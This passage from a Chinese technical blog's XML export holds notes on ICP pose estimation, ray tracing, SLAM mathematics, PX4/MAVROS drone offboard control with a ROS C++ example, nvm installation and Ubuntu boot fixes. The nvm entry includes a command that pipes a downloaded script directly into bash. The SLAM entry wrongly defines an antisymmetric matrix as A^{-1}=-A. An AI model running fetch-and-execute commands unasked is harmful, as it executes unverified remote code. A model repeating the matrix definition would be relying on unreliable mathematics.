3D-3D估计3D-3D的位姿估计问题是指，对于空间中的某一点，我们知道这个点在两个相机坐标系中的三维坐标，如何利用这两个三维坐标来求解这两个相机坐标系的运动就是3D-3D的位姿评估问题。这个问题通常用迭代最近点(Iterative Closest Point,ICP)求解。 假设空间中的一系列点在第一个相机坐标系下的三维坐标为$C={c_1,…,c_n}$，在第二个相机坐标系下匹配的三维坐标为$C’={c_1’,…,c’_n}$。则有： \forall i, \ c_i=Rc_i’+t对于ICP的求解主要分为两种方式：利用线性代数的求解和利用非线性优化方式求解。 线性代数求解构造误差项： e_i = c_i - (Rc_i’+t)将这个误差项构造成一个最小二乘问题： \min \limits _{R,t} J= \dfrac{1}{2} \sum \limits _{i=1} ^n \begin{Vmatrix} c_i - (Rc_i’+t) \end{Vmatrix} _2 ^2通过求解这个最小二乘问题，我们可以得到R和t。 总结相机位姿估计最终目标是获得表征相机运动的旋转矩阵R和平移向量t，可分成两种方法：一种是2D-2D估计加三角测量，另一种是3D-2D估计加3D-3D估计。 参考链接 SLAM相机位姿估计(1),by zhaoxuhui. 2D-2D相机位姿估计,by 金戈大王. 单目相机中的对极几何,by 一索哥传奇. 三角测量,by 金戈大王. 三角测量,by wikipedia. 单目相机中的三角化测量,by 一索哥传奇. 3D-2D相机位姿估计,by 金戈大王. 3D-3D相机位姿估计,by 金戈大王. 相机位姿求解问题？, by zhihu. 3D-2D的运动估计,by 一索哥传奇. 3D-3D的运动估计,by 一索哥传奇. 相机位姿求解——P3P问题,by 达达MFZ. 图像二维坐标转世界三维坐标,by 橙子.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>无人机</tag>
        <tag>计算机图形学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[光线追踪基本概念入门]]></title>
    <url>%2F2019%2F05%2F26%2F%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[光线追踪（Ray tracing）是三维计算机图形学中的特殊渲染算法，跟踪从眼睛发出的光线而不是光源发出的光线，通过这样一项技术生成编排好的场景的数学模型显现出来。光线追踪的优点可以提供更为真实的光影效果，缺点是计算量巨大。 基本概念光线追踪与光栅化渲染作为相对的两个概念，理解光栅化渲染更能解释光线追踪的概念。 光栅化渲染是将向量图形格式表示的图像转换成位图以用于显示器或者打印机输出的过程，如图1所示。 图1 光栅化渲染示意图 光线追踪的示意图如图2所示。[Whitted 1980]提出了使用光线跟踪来在计算机上生成图像的方法，这一方法后来也被称为经典光线跟踪方法或Whitted-style 光线跟踪方法。其主要思想是从视点向成像平面上的像素发射光线，找到与该光线相交的最近物体的交点，如果该点处的表面是散射面，则计算光源直接照射该点产生的颜色；如果该点处表面是镜面或折射面，则继续向反射或折射方向跟踪另一条光线，如此递归下去，直到光线逃逸出场景或达到设定的最大递归深度。这种经典的方法可以产生镜面反射、折射、阴影等效果，不过不能实现其他的全局光照的效果。 图2 光线追踪示意图 辐射度学基本量图形学模拟可见光与各种材质的交互，这个过程涉及到能量的传输。辐射度学（Radiometry）是度量电磁辐射能量传输的学科，也是基于物理着色模型的基础。 能量 能量（Energy），用符号Q表示，单位焦耳（J），每个光子都具有一定量的能量，和频率相关，频率越高，能量也越高。 功率 功率（Power），单位瓦特（Watts），或者焦耳／秒（J/s）。辐射度学中，辐射功率也被称为辐射通量（Radiant Flux）或者通量（Flux），指单位时间内通过表面或者空间区域的能量的总量，用符号\Phi 表示，定义 $\Phi = \frac{ dQ}{dt}$。 辐照度和辐出度 辐照度（Irradiance），指单位时间内到达单位面积的辐射能量，或到达单位面积的辐射通量，也就是通量对于面积的密度。用符号E表示，单位 $W / m^{2}$ 。定义为 $E = \frac{d\Phi }{dA}$。 辐出度（Radiant Existance），也称为辐射出射度、辐射度（Radiosity），用符号M表示。辐出度与辐照度类似，唯一的区别在辐出度衡量的是离开表面的通量密度，辐照度衡量的是到达表面的通量密度。辐照度和辐出度都可以称为辐射通量密度（Radiant Flux Density）。 辐射强度 立体角则是度量三维角度的量，用符号 $\omega$ 表示，单位为立体弧度（也叫球面度，Steradian，简写为sr），等于立体角在单位球上对应的区域的面积（实际上也就是在任意半径的球上的面积除以半径的平方 $\omega = \frac {s}{r^{2} }$ ），单位球的表面积是 $4\pi$ ，所以整个球面的立体角也是$4\pi$ 。 辐射强度（Radiant Intensity），指通过单位立体角的辐射通量。用符号I表示，单位 $W / sr$，定义为 $I = \frac{d \Phi }{d \omega }$ 。之所以引入辐射强度，是因为有时候要度量通过一个点的通量的密度，但因为点的面积是0，无法使用辐照度，所以引入辐射强度。辐射强度不会随距离变化而变化，不像点光源的辐照度会随距离增大而衰减，这是因为立体角不会随距离变化而变化。 辐射率 辐射率（Radiance），指每单位面积每单位立体角的辐射通量密度。用符号 $L$ 表示，单位 $W/m^{2} sr$ ，定义为 $L = \frac{d \Phi }{d\omega d A^{\bot } }$ 。其中 $dA^{\bot}$是微分面积dA在垂直于光线方向的投影。 渲染方程（The Rendering Equation）[Kajiya 1986]第一次将渲染方程引入图形学，使用它来解释光能传输的产生的各种现象。这一方程描述了场景中光能传输达到稳定状态以后，物体表面某个点在某个方向上的辐射亮度（Radiance）与入射辐射亮度等的关系。 L_o(x,w_o)=L_e(x,w_0)+\int_\Omega{f_r(x,w_i,w_0)L_i(x,w_i)cos\theta_idw_i}其中，$Lo(x,w_o)$ 表示物体表面点 $x$ 处在方向 $𝜔𝑜$ 上出射的辐射亮度，$𝐿𝑒(𝑥, 𝜔0)$ 表示在该点该方向上自辐射的亮度。$𝐿𝑖(𝑥,𝜔𝑖)$ 表示该点处 $𝜔𝑖$ 方向入射的辐射亮度，$𝑓𝑟(𝑥, 𝜔𝑖, 𝜔𝑜)$ 是双向反射分布函数（BRDF），描述的是入射方向的辐射亮度对出射方向的贡献，$cos 𝜃𝑖$ 是$𝜔𝑖$与表面法向的点积。在这一方程的基础上，辐射度方法和蒙特卡罗光线跟踪的方法就可以看成是对方程中积分的不同的数值求解方法。 BRDF描述的是表面本身的性质，比如它的光滑程度，导电程度等等。由于四面八方的光线都会作用在这个表面，所以我们需要对所有方向进行积分，也就是一个球面上的积分，考虑到积分项中的 $(w_i\cdot n)$ ，那么只有位于正半空间的方向才会对最终积分有贡献，所以最后这个球面的积分就变成了一个半球的积分，如图3所示。 图3 BRDF示意图 双向反射分布函数（bidirectional reflectance distribution function, BRDF）在计算机图形学领域，着色（Shading）是指根据表面或者多边形相对光源和相机的角度和距离来计算它的颜色的过程。不同的用途可以使用不同的着色算法，CAD等追求响应速度的交互式图形领域可以使用简单快速的着色算法，卡通油画等艺术效果可以使用非真实感（Nonphotorealistic）着色算法，而追求真实感的CG电影或游戏则可以使用基于物理建模的着色算法。而BRDF是基于物理建模的着色算法的理论基础。 我们看到一个表面，实际上是周围环境的光照射到表面上，然后表面将一部分光反射到我们眼睛里。双向反射分布函数BRDF（Bidirectional Reflectance Distribution Function）就是描述表面入射光和反射光关系的。 对于一个方向的入射光，表面会将光反射到表面上半球的各个方向，不同方向反射的比例是不同的，我们用BRDF来表示指定方向的反射光和入射光的比例关系，BRDF定义为： f(l,v)=\frac{dL_o(v)}{dE(l)}其中，$f$就是BRDF，$l$是入射光方向，$v$是观察方向，也就是我们关心的反射光方向。$d L_o(v)$ 是表面反射到$v$方向的反射光的微分辐射率。表面反射到$v$方向的反射光的辐射率为$L_o(v)$，来自于表面上半球所有方向的入射光线的贡献，而微分辐射率 $d L_o(v)$ 特指来自方向 $l$ 的入射光贡献的反射辐射率。$dE(l)$是表面上来自入射光方向 $l$ 的微分辐照度。表面接收到的辐照度为 $E$ ，来自上半球所有方向的入射光线的贡献，而微分辐照度 $dE(l)$ 特指来自于方向 $l$ 的入射光。 光照模型（illumination model）当光照射到物体表面时,物体对光会发生反射、透射、吸收、衍射、折射、和干涉,其中被物体吸收的部分转化为热,反射、透射的光进入人的视觉系统,使我们能看见物体。为模拟这一现象,我们建立一些数学模型来替代复杂的物理模型，这些模型就称为明暗效应模型或者光照明模型。 局部光照模型在真实感图形学中,仅处理光源直接照射物体表面的光照明模型被称为局部光照明模型。局部光照明模型的分类如图4所示。 图4 局部光照模型分类 局部光照模型是一种比较简单的光照模型，它是与光栅化渲染算法相适应的，光栅化算法一次只考虑一个像素的光照强度，因此局部光照模型不能计算某像素受其他像素影响的光照强度部分。也就是说，局部光照模型只对物体进行直接光照的计算，而不考虑其他的间接影响。 全局光照模型全局光照模型是基于光学物理原理的，光照强度的计算依赖于光能在现实世界中的传播情况，考虑光线与整个场景中各物体表面及物体表面间的相互影响，包括多次反射 、透射 、散射等。因此，与局部光照模型相比，全局光照模型需要相当大的计算量 ，但同时也能取得非常逼真的真实效果 。全局光照模型分类如图5所示。 图5 全局光照模型分类 求交检测在光线追踪过程中，从眼睛发出的光线与3D模型的三角面求交是一个复杂问题。通常精致的3D模型可能由几十万至上百万三角面构成，如果采用穷举法求交点，其时间复杂度将是O(n), 过于复杂。为了减少不必要的求交检测，应采用空间划分技术，最常用的是平衡kdtree算法，提高求交检测的效率。 k-d tree在计算机科学里，k-d树（ k-维树的缩写）是在k维欧几里德空间组织点的数据结构。k-d树可以使用在多种应用场合，如多维键值搜索（例：范围搜寻及最邻近搜索）。k-d树是空间二分树（Binary space partitioning ）的一种特殊情况。 k-d树是每个节点都为k维点的二叉树。所有非叶子节点可以视作用一个超平面把空间分割成两个半空间。节点左边的子树代表在超平面左边的点，节点右边的子树代表在超平面右边的点。选择超平面的方法如下：每个节点都与k维中垂直于超平面的那一维有关。因此，如果选择按照x轴划分，所有x值小于指定值的节点都会出现在左子树，所有x值大于指定值的节点都会出现在右子树。这样，超平面可以用该x值来确定，其法线为x轴的单位向量。 参考链接 光线追踪,by wikipedia. 栅格化,by wikipedia. 渲染,by wikipedia. 光线追踪基本概念与代码实现,by 鹅城惊喜师爷. 一篇光线追踪的入门,by 洛城. 基于蒙特卡罗的光线跟踪绘制方法,by 严俊. 基于物理着色：BRDF,by Maple. Monte-Carlo Ray Tracing System (一)原理以及设计,by 已退逼乎. 冯氏光照模型—镜面光的计算,by MooAiFighting. 什么是光照模型,by 黄琦. 蒙特卡洛光线追踪,by sunacmer. k-d树,by wikipedia. 辐射强度、辐亮度、辐照度——一文搞定,by 三眼二郎.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机图形学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SLAM中位姿估计的数学基础]]></title>
    <url>%2F2019%2F05%2F20%2FSLAM%E4%B8%AD%E4%BD%8D%E5%A7%BF%E4%BC%B0%E8%AE%A1%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[同步定位与地图构建（SLAM或Simultaneous localization and mapping）是一种概念：希望机器人从未知环境的未知地点出发，在运动过程中通过重复观测到的地图特征（比如，墙角，柱子等）定位自身位置和姿态，再根据自身位置增量式的构建地图，从而达到同时定位和地图构建的目的。 SLAM的核心工作有两个： 地图构建 研究如何把从一系列传感器收集到的信息，集成到一个一致性的模型上的问题。它可以被描述为第一核心问题：这个世界长什么样？地图构建的核心部分是环境的表达方式以及传感器数据的解释。 定位 研究在地图上估测机器人的坐标和姿势形态的问题；换而言之，机器人需要回答这里的第二核心问题，我在哪？典型的解包含以下两个方面：追踪——通常机器人的初始位置已知；全局定位——通常只给出很少，甚至不给出有关于起始位置环境特征的先验信息。 下面主要介绍SLAM定位研究中涉及的数学知识。 向量点积有如下两个向量: a=\begin{pmatrix} a_{1}\\ a_{2}\\ a_{3} \end{pmatrix},b=\begin{pmatrix} b_{1}\\ b_{2}\\ b_{3} \end{pmatrix}它们的点乘定义如下： % 即两个向量点乘等于一个向量的转置乘以另一个向量。 向量叉积两个向量做叉积结果还是一个向量，这个向量垂直于这两个做叉积的向量所组成的平面。 a\times b=\begin{vmatrix} i & j & k\\ a_{1} & a_{2} & a_{3}\\ b_{1} & b_{2} & b_{3} \end{vmatrix}=(a_{2}b_{3}-a_{3}b_{2})i+(a_{3}b_{1}-a_{1}b_{3})j+(a_{1}b_{2}-a_{2}b_{1})k为了计算方便，将两个向量写成行列式的形式，然后按对角线法则计算行列式的值。i、j、k分量分别即代表x、y、z轴方向的分量。写成列向量的形式如下: \begin{pmatrix} a_{2}b_{3}-a_{3}b_{2}\\ a_{3}b_{1}-a_{1}b_{3}\\ a_{1}b_{2}-a_{2}b_{1} \end{pmatrix}=\begin{pmatrix} 0\cdot b_{1}-a_{3}b_{2}+a_{2}b_{3}\\ a_{3}b_{1}-0\cdot b_{2}-a_{1}b_{3}\\ -a{2}b_{1}+a_{1}b_{2}+0\cdot b_{3} \end{pmatrix}=\begin{pmatrix} 0 & -a_{3} & a_{2}\\ a_{3} & 0 & -a_{1}\\ -a_{2} & a_{1} & 0 \end{pmatrix}\begin{pmatrix} b_{1}\\ b_{2}\\ b_{3} \end{pmatrix}再将其写成与b相乘的矩阵形式，提取系数矩阵。这个系数矩阵就称作向量a的反对称矩阵，用a^记。所谓反对称矩阵，是指满足下面这个条件的矩阵。 A^{-1}=-A因为向量叉积的结果是一个向量，因此可以用来表示旋转，结果向量的方向为旋转轴，大小为旋转角。结果可以看作一个旋转向量。 对极几何两个相机在不同位置拍摄同一物体，两张照片中的景物有重叠部分，那么理论上这两张照片会存在一定的对应关系，而对极几何就是探索描述它们之间对应关系的工具。相机在不同位置拍摄同一物体示意图如图1所示。 图1 相机在不同位置拍摄同一物体示意图 图中的概念有： 极点e：分别是左边相机中心在右图像平面上的像，右相机中心在左像平面上的像。 极平面：两个相机中心和空间中某店p形成的平面。 极线l：极平面分别和两个像平面的交线。 对极几何则是描述这几个量之间的对应关系。直观讲，从左图的角度看，如果不知道p点的深度信息，射线op是这个点可能出现的空间位置，因为该射线上的点都会投影到同一个像素点，同时，如果不知道p点的具体位置，那么当在右图的位置看时，极线 l’ 就是点p可能出现的位置，即在这条线上的某个地方。如图2所示: 图2 物体位置示意图 在计算机视觉中，基础矩阵（Fundamental matrix） F 是一个3×3的矩阵，表达了立体像对的像点之间的对应关系。在对极几何中，对于立体像对中的一对同名点，它们的齐次化图像坐标分别为 $p$ 与 $p’$， ${\displaystyle \mathrm {F} p}$ 表示一条必定经过 $p’$的直线（极线）。这意味着立体像对的所有同名点对都满足： {\displaystyle p'^{\top }\mathrm {F} p=0.}F矩阵中蕴含了立体像对的两幅图像在拍摄时相互之间的空间几何关系（外参数）以及相机检校参数（内参数），包括旋转、位移、像主点坐标和焦距。因为 F 矩阵的秩为2，并且可以自由缩放（尺度化），所以只需7对同名点即可估算出F的值。 基础矩阵这一概念由Q. T. Luong在他那篇很有影响力的博士毕业论文中提出。Faugeras则是在1992年发表的著作中以上面的关系式给出了 F 矩阵的定义。尽管Longuet-Higgins提出的本质矩阵也满足类似的关系式，但本质矩阵中并不蕴含相机检校参数。本质矩阵与基础矩阵之间的关系可由下式表达： {\displaystyle \mathrm {E} =\mathrm {K'^{\top }} \mathrm {FK} .}其中 $K$和 $K’$分别为两个相机的内参数矩阵。 参考链接 SLAM数学基础,by zhaoxuhui. 即时定位与地图构建,by wikipedia. 大牛讲堂｜SLAM第一篇：基础知识, by 地平线HorizonRobotics. 学习SLAM需要哪些预备知识？,by wikipedia. 计算机视觉中的数学方法,by 吴福朝. 对极几何及单应矩阵, by Rap_God.​]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PX4无人机MAVROS外部控制教程]]></title>
    <url>%2F2019%2F05%2F15%2FPX4%E6%97%A0%E4%BA%BA%E6%9C%BAMAVROS%E5%A4%96%E9%83%A8%E6%8E%A7%E5%88%B6%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[PX4中的offboard模式能够接受来自外部的控制指令，搭配机载或支持MAVROS的协同计算机，可在PX4飞控平台上加入视觉处理或人工智能，以实现无人机自动控制功能。下面即介绍如何在基于MAVROS的协同计算机上运行程序控制PX4无人机。具体过程如下： PX4固件参数设置在开始无人机外部控制开发之前，您需要在PX4固件中设置两件事: 将RC开关映射到场外模式激活 要执行此操作，请在QGroundControl中加载参数并查找RC_MAP_OFFB_SW参数，您可以为其分配要用于激活offboard模式的RC通道。 以这样一种方式映射事物是非常有用的。当你脱离offboard模式时，你会进入位置控制。 虽然此步骤不是强制性的，因为您可以使用MAVLink消息激活offboard模式。 我们认为这种方法更安全。 启用配套计算机接口 查找SYS_COMPANION参数并将其设置为921600（推荐）或57600. 此参数将激活Telem2端口上的MAVLink流，其中包含特定于板载模式的数据流以及相应的波特率（921600 8N1或57600 8N1）。 本人实验测试时SYS_COMPANION参数设置成Companion Link(57600) 。此外要注意通过Telem2端口的无线收发装置与地面支持MAVROS的具有无线收发装置的协同计算机连接。并长按安全锁手动解锁无人机。 安装MAVROS在地面协同计算机上安装MAVROS请参考Ubuntu16.04安装MAVROS，完成后使用如下命令启动MAVROS: 123$ roscore# 启动MAVROS,链接到本地ROS$ roslaunch mavros px4.launch fcu_url:=serial:///dev/ttyUSB0:57600 构建Offboard示例程序ROS节点Offboard示例程序的构建请参考ROS构建Package和Node的教程，完成后使用如下命令启动Offboard示例程序： 123$ cd catkin_ws/$ source devel/setup.bash$ rosrun offboard offboard_node 参考链接 PX4软件在环仿真之MAVROS外部控制,by jackhuang. Offboard Control, by dronecode.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>PX4</tag>
        <tag>Gazebo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PX4软件在环仿真之MAVROS外部控制]]></title>
    <url>%2F2019%2F05%2F15%2FPX4%E8%BD%AF%E4%BB%B6%E5%9C%A8%E7%8E%AF%E4%BB%BF%E7%9C%9F%E4%B9%8BMAVROS%E5%A4%96%E9%83%A8%E6%8E%A7%E5%88%B6%2F</url>
    <content type="text"><![CDATA[PX4软件在环仿真之MAVROS外部控制将使用基于MAVROS的PX4外部控制ROS节点，控制在Gazebo仿真环境中的四悬翼无人机,如图1所示。 图1 px4软件在环仿真 具体步骤如下： 构建PX4自驾仪请参考PX4编译开发环境配置和Development Environment on Linux配置PX4编译开发环境。需要指出的是，为使用Gazebo仿真环境，PX4开发工具链使用脚本ubuntu_sim_ros_gazebo.sh构建。 PX4编译开发环境配置完成后，使用如下命令启动：12$ cd ~/src/Firmware$ make posix_sitl_default gazebo 安装MAVROS安装MAVROS请参考Ubuntu16.04安装MAVROS，完成后使用如下命令启动MAVROS: 123$ roscore# 启动MAVROS,链接到本地ROS$ roslaunch mavros px4.launch fcu_url:=&quot;udp://:14540@127.0.0.1:14557&quot; 构建Offboard示例程序ROS节点Offboard示例程序的构建请参考ROS构建Package和Node的教程，完成后使用如下命令启动Offboard示例程序： 123$ cd catkin_ws/$ source devel/setup.bash$ rosrun offboard offboard_node 最终能够在Gazebo仿真环境中观察到四悬翼无人机垂直起飞到2米的高度。 参考链接 Ubuntu16.04安装MAVROS,by jackhuang. ROS构建Package和Node的教程,by jackhuang. PX4编译开发环境配置,by jackhuang. Development Environment on Linux, by dronecode.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>PX4</tag>
        <tag>Gazebo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ROS构建Package和Node的教程]]></title>
    <url>%2F2019%2F05%2F15%2FROS%E6%9E%84%E5%BB%BAPackage%E5%92%8CNode%E7%9A%84%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[ROS（机器人操作系统，Robot Operating System），是专为机器人软件开发所设计出来的一套电脑操作系统架构。它是一个开源的元级操作系统（后操作系统），提供类似于操作系统的服务，包括硬件抽象描述、底层驱动程序管理、共用功能的执行、程序间消息传递、程序发行包管理，它也提供一些工具和库用于获取、建立、编写和执行多机融合的程序。 ROS的运行架构是一种使用ROS通信模块实现模块间P2P的松耦合的网络连接的处理架构，它执行若干种类型的通讯，包括： 基于服务的同步RPC（远程过程调用）通讯； 基于Topic的异步数据流通讯，还有参数服务器上的数据存储。 ROS可与PX4一起用于飞行器的外部控制, 它使用MAVROS节点与在硬件上运行的PX4或使用Gazebo Simulator进行通信。MAVROS节点的安装请参考Ubuntu16.04安装MAVROS，下面以编写基于MAVROS的外部控制节点为例，介绍ROS包和节点的构建过程。 ROS包构建方法catkin和rosbuild是构建ROS包的两种方法。目前多用catkin构建ros包。 catkin包可以构建为独立项目，与构建普通cmake项目的方式相同，但catkin还提供了工作空间的概念，您可以在其中同时构建多个相互依赖的包。 ROS包构成ROS包是其代码组织的一种高级结构好哦，最简单的catkin包的构成如下： 123my_package/ CMakeLists.txt package.xml 其中: 包必须包含一个符合catkin的package.xml文件。 该package.xml文件提供有关包的元信息。 包必须包含一个使用catkin的CMakeLists.txt。 如果它是catkin元数据包，它必须具有相关的样板CMakeLists.txt文件。 包都必须有自己的文件夹。 这意味着没有嵌套包，也没有多个包共享同一目录。 catkin工作空间的构成使用catkin软件包的推荐方法是使用catkin工作区，但您也可以独立构建catkin软件包。 一个简单的工作空间可能如下所示： 12345678910workspace_folder/ -- WORKSPACE src/ -- SOURCE SPACE CMakeLists.txt -- &apos;Toplevel&apos; CMake file, provided by catkin package_1/ CMakeLists.txt -- CMakeLists.txt file for package_1 package.xml -- Package manifest for package_1 ... package_n/ CMakeLists.txt -- CMakeLists.txt file for package_n package.xml -- Package manifest for package_n 创建catkin包通常使用catkin_create_pkg命令创建新的catkin包，具体步骤如下： 12345678$ mkdir -p ~/catkin_ws/src$ cd ~/catkin_ws/src# 创建名为offboard的ros包，它依赖roscpp、mavros和geometry_msgs$ catkin_create_pkg offboard roscpp mavros geometry_msgs$ cd offboard/src/# 创建offboard_node.cpp，将官方PX4外部控制例程代码写入该文件# 该文件也是offboard包的第一个node$ touch offboard_node.cpp offboard_node.cpp文件的具体内容如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687/** * @file offb_node.cpp * @brief Offboard control example node, written with MAVROS version 0.19.x, PX4 Pro Flight * Stack and tested in Gazebo SITL */#include &lt;ros/ros.h&gt;#include &lt;geometry_msgs/PoseStamped.h&gt;#include &lt;mavros_msgs/CommandBool.h&gt;#include &lt;mavros_msgs/SetMode.h&gt;#include &lt;mavros_msgs/State.h&gt;mavros_msgs::State current_state;void state_cb(const mavros_msgs::State::ConstPtr&amp; msg)&#123; current_state = *msg;&#125;int main(int argc, char **argv)&#123; ros::init(argc, argv, &quot;offb_node&quot;); ros::NodeHandle nh; ros::Subscriber state_sub = nh.subscribe&lt;mavros_msgs::State&gt; (&quot;mavros/state&quot;, 10, state_cb); ros::Publisher local_pos_pub = nh.advertise&lt;geometry_msgs::PoseStamped&gt; (&quot;mavros/setpoint_position/local&quot;, 10); ros::ServiceClient arming_client = nh.serviceClient&lt;mavros_msgs::CommandBool&gt; (&quot;mavros/cmd/arming&quot;); ros::ServiceClient set_mode_client = nh.serviceClient&lt;mavros_msgs::SetMode&gt; (&quot;mavros/set_mode&quot;); //the setpoint publishing rate MUST be faster than 2Hz ros::Rate rate(20.0); // wait for FCU connection while(ros::ok() &amp;&amp; !current_state.connected)&#123; ros::spinOnce(); rate.sleep(); &#125; geometry_msgs::PoseStamped pose; pose.pose.position.x = 0; pose.pose.position.y = 0; pose.pose.position.z = 2; //send a few setpoints before starting for(int i = 100; ros::ok() &amp;&amp; i &gt; 0; --i)&#123; local_pos_pub.publish(pose); ros::spinOnce(); rate.sleep(); &#125; mavros_msgs::SetMode offb_set_mode; offb_set_mode.request.custom_mode = &quot;OFFBOARD&quot;; mavros_msgs::CommandBool arm_cmd; arm_cmd.request.value = true; ros::Time last_request = ros::Time::now(); while(ros::ok())&#123; if( current_state.mode != &quot;OFFBOARD&quot; &amp;&amp; (ros::Time::now() - last_request &gt; ros::Duration(5.0)))&#123; if( set_mode_client.call(offb_set_mode) &amp;&amp; offb_set_mode.response.mode_sent)&#123; ROS_INFO(&quot;Offboard enabled&quot;); &#125; last_request = ros::Time::now(); &#125; else &#123; if( !current_state.armed &amp;&amp; (ros::Time::now() - last_request &gt; ros::Duration(5.0)))&#123; if( arming_client.call(arm_cmd) &amp;&amp; arm_cmd.response.success)&#123; ROS_INFO(&quot;Vehicle armed&quot;); &#125; last_request = ros::Time::now(); &#125; &#125; local_pos_pub.publish(pose); ros::spinOnce(); rate.sleep(); &#125; return 0;&#125; 之后需要修改~/catkin_ws/src/offboard目录下的CMakeLists.txt文件。取消掉一些注释，生成相应节点（否则会出现找不到节点的错误）。 构建catkin包在catkin工作空间（catkin_ws）中，使用catkin_make工具从源文件构建和安装一个包： 1234567$ cd ~/catkin_ws$ catkin_make$ catkin_make install# 配置catkin工作空间，使ros能找到刚生成的offboard包$ source devel/setup.bash# 查看ros包路径环境变量是否配置好$ echo $ROS_PACKAGE_PATH 参考链接 Ubuntu16.04安装MAVROS,by jackhuang. Creating a ROS Package, by ros homepage. Building a ROS Package, by ros homepage. Understanding ROS Nodes, by ros homepage. catkin 与 rosbuild解析及两者区别和联系,by Xuefeng_BUPT. Pixhawk原生固件PX4之SITL软件在环仿真,by FantasyJXF. Pixhawk原生固件PX4之offboard,by FantasyJXF. MAVROS Offboard control example, by dronecode.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>PX4</tag>
        <tag>ROS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用nvm进行nodejs版本管理]]></title>
    <url>%2F2019%2F05%2F11%2F%E4%BD%BF%E7%94%A8nvm%E8%BF%9B%E8%A1%8Cnodejs%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[nvm是一个简单bash脚本，用于管理多个活动的nodejs版本。在linux操作系统中使用nvm安装和管理nodejs十分方便。在windows操作系统下则使用nvm-windows对nodejs版本进行管理。下面简单介绍ubuntu 16.04操作系统下nvm的安装使用。 安装脚本在Ubuntu 16.04的终端中，直接运行如下命令： 1wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.34.0/install.sh | bash 管理Nodejs 安装最新nodejs长期支持版 1nvm install --lts 卸载最新nodejs长期支持版 1nvm uninstall --lts 参考链接 Node Version Manager, by nvm-sh. nvm-windows,by nvm-windows.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dell笔记本安装Ubuntu16.04出现的问题及解决方案]]></title>
    <url>%2F2019%2F05%2F11%2FDell%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85Ubuntu16-04%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[PX4开发推荐在Ubuntu16.04上进行，然在一些带独立显卡的笔记本上安装时，进入安装界面就卡住了。问题产生原因显然与显卡驱动有关。 解决方案解决方案可参考链接Ubuntu16.04—64位安装及使用中出现的问题。主要有两种方法： 重新开机，光标选中“Install Ubuntu” ，按“e”，进入grub界面，将倒数第二行中的“quiet splash —-”改为“nomodeset”。F10保存，就可以进入安装界面，进行安装。 如果加入nomodeset参数不行，则试试加入nouveau.modeset=0，步骤一样。 后续维护如果能顺利安装，则安装好后，添加选项到/etc/default/grub文件。步骤如下：1sudo gedit /etc/default/grub 然后将nomodeset选项添加到 GRUB_CMDLINE_LINUX_DEFAULT: 1234567GRUB_DEFAULT=0GRUB_HIDDEN_TIMEOUT=0GRUB_HIDDEN_TIMEOUT_QUIET=trueGRUB_TIMEOUT=5GRUB_DISTRIBUTOR=`lsb_release -i -s 2&gt; /dev/null || echo Debian`GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet splash nomodeset&quot;GRUB_CMDLINE_LINUX=&quot;&quot; 最后更显grub启动文件：1sudo update-grub 参数含义附内核显示参数的含义：123456789101112131415nomodeset 不载入所有关于显示卡的驱动nouveau.modeset=0 关闭nvidia显卡的驱动，反之=1为开启i915.modeset=0 关闭Intel显卡的驱动，挺好奇对于Intel内显会有什么影响xforcevesa或radeon.modeset=0 xforcevesa 跟AMD显卡(ATI)有关的设定，我猜也是关闭acpi=off 回归旧时代，电源相关设定，OS无法控管，交给bios处理acpi功能失效，有不少硬体上奇怪的问题，可以用这参数解决 参考链接 Ubuntu16.04—64位安装及使用中出现的问题,by 一部电影. acpi_osi=linux、 nomodeset是什么意思? 功能?, by 峰Caesar. How do I set ‘nomodeset’ after I’ve already installed Ubuntu?,by askubuntu.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu16.04安装MAVROS]]></title>
    <url>%2F2019%2F05%2F10%2FUbuntu16-04%E5%AE%89%E8%A3%85MAVROS%2F</url>
